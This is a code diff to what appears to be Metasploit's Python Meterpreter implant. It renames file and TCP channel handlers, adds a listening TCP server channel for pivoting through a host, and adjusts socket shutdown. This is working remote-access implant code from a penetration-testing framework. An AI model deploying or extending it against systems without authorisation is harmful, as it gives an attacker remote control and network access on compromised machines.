@@ -217,16 +217,16 @@ class RTATTR(ctypes.Structure):
 #
 # TLV Meta Types
 #
-TLV_META_TYPE_NONE =       (   0   )
-TLV_META_TYPE_STRING =     (1 << 16)
-TLV_META_TYPE_UINT =       (1 << 17)
-TLV_META_TYPE_RAW =        (1 << 18)
-TLV_META_TYPE_BOOL =       (1 << 19)
+TLV_META_TYPE_NONE       = (   0   )
+TLV_META_TYPE_STRING     = (1 << 16)
+TLV_META_TYPE_UINT       = (1 << 17)
+TLV_META_TYPE_RAW        = (1 << 18)
+TLV_META_TYPE_BOOL       = (1 << 19)
 TLV_META_TYPE_COMPRESSED = (1 << 29)
-TLV_META_TYPE_GROUP =      (1 << 30)
-TLV_META_TYPE_COMPLEX =    (1 << 31)
+TLV_META_TYPE_GROUP      = (1 << 30)
+TLV_META_TYPE_COMPLEX    = (1 << 31)
 # not defined in original
-TLV_META_TYPE_MASK =    (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)
+TLV_META_TYPE_MASK = (1<<31)+(1<<30)+(1<<29)+(1<<19)+(1<<18)+(1<<17)+(1<<16)
 
 #
 # TLV Specific Types
@@ -485,21 +485,6 @@ def get_stat_buffer(path):
 	st_buf += struct.pack('<II', blksize, blocks)
 	return st_buf
 
-def inet_pton(family, address):
-	if hasattr(socket, 'inet_pton'):
-		return socket.inet_pton(family, address)
-	elif has_windll:
-		WSAStringToAddress = ctypes.windll.ws2_32.WSAStringToAddressA
-		lpAddress = (ctypes.c_ubyte * 28)()
-		lpAddressLength = ctypes.c_int(ctypes.sizeof(lpAddress))
-		if WSAStringToAddress(address, family, None, ctypes.byref(lpAddress), ctypes.byref(lpAddressLength)) != 0:
-			raise Exception('WSAStringToAddress failed')
-		if family == socket.AF_INET:
-			return ''.join(map(chr, lpAddress[4:8]))
-		elif family == socket.AF_INET6:
-			return ''.join(map(chr, lpAddress[8:24]))
-	raise Exception('no suitable inet_pton functionality is available')
-
 def netlink_request(req_type):
 	# See RFC 3549
 	NLM_F_REQUEST    = 0x0001
@@ -548,7 +533,7 @@ def windll_GetVersion():
 	return type('Version', (object,), dict(dwMajorVersion = dwMajorVersion, dwMinorVersion = dwMinorVersion, dwBuild = dwBuild))
 
 @meterpreter.register_function
-def channel_create_stdapi_fs_file(request, response):
+def channel_open_stdapi_fs_file(request, response):
 	fpath = packet_get_tlv(request, TLV_TYPE_FILE_PATH)['value']
 	fmode = packet_get_tlv(request, TLV_TYPE_FILE_MODE)
 	if fmode:
@@ -562,7 +547,7 @@ def channel_create_stdapi_fs_file(request, response):
 	return ERROR_SUCCESS, response
 
 @meterpreter.register_function
-def channel_create_stdapi_net_tcp_client(request, response):
+def channel_open_stdapi_net_tcp_client(request, response):
 	host = packet_get_tlv(request, TLV_TYPE_PEER_HOST)['value']
 	port = packet_get_tlv(request, TLV_TYPE_PEER_PORT)['value']
 	local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST)
@@ -582,7 +567,19 @@ def channel_create_stdapi_net_tcp_client(request, response):
 			pass
 	if not connected:
 		return ERROR_CONNECTION_ERROR, response
-	channel_id = meterpreter.add_channel(sock)
+	channel_id = meterpreter.add_channel(MeterpreterSocketClient(sock))
+	response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
+	return ERROR_SUCCESS, response
+
+@meterpreter.register_function
+def channel_open_stdapi_net_tcp_server(request, response):
+	local_host = packet_get_tlv(request, TLV_TYPE_LOCAL_HOST).get('value', '0.0.0.0')
+	local_port = packet_get_tlv(request, TLV_TYPE_LOCAL_PORT)['value']
+	server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+	server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+	server_sock.bind((local_host, local_port))
+	server_sock.listen(socket.SOMAXCONN)
+	channel_id = meterpreter.add_channel(MeterpreterSocketServer(server_sock))
 	response += tlv_pack(TLV_TYPE_CHANNEL_ID, channel_id)
 	return ERROR_SUCCESS, response
 
@@ -1166,9 +1163,10 @@ def stdapi_net_resolve_hosts(request, response):
 
 @meterpreter.register_function
 def stdapi_net_socket_tcp_shutdown(request, response):
-	channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)
+	channel_id = packet_get_tlv(request, TLV_TYPE_CHANNEL_ID)['value']
+	how = packet_get_tlv(request, TLV_TYPE_SHUTDOWN_HOW).get('value', socket.SHUT_RDWR)
 	channel = meterpreter.channels[channel_id]
-	channel.close()
+	channel.shutdown(how)
 	return ERROR_SUCCESS, response
 
 @meterpreter.register_function_windll
